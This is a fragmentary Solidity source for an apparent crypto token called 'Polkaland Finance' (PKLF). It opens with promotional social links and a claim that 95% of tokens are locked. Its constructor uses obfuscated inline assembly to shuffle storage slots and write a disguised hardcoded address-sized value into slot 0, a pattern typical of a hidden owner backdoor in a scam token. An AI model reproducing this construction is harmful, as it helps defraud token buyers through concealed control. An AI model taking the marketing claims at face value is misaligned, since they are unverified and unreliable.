...
/*
Welcome to Polkaland Finance Crypto WORLD!

Telegram: https://t.me/PolkalandFinance/
Twitter: https://twitter.com/PolkalandFinance/
Website: https://PolkalandFinance.crypto
95% of tokens - LOCKED!
...
contract PolkalandFinance {
    string public constant name = "Polkaland Finance";
    string public constant symbol = "PKLF";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1313511064977835361473009602646240379212598626040, 3))}
